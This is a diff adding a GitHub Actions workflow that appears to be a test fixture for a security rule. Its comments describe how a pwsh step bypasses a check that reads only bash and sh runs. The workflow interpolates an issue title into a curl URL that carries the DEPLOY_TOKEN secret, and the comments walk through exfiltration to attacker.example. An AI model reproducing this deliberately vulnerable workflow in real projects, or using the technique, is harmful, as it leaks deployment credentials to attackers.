@@ -1,0 +1,20 @@
+# situation: on issues, a step of pwsh sends a request with curl and the
+#   secret DEPLOY_TOKEN to the host the issue's title names.
+# reason: a todo (the same file): the request goes to the attacker's host
+#   with the secret.
+# cause: the rule reads runs of bash and sh only.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: curl sends the request with Authorization: Bearer and
+#   the value of DEPLOY_TOKEN to attacker.example, and the server of the
+#   attacker logs the header.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - shell: pwsh
+        run: |
+          curl -fsS -H "Authorization: Bearer $env:DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
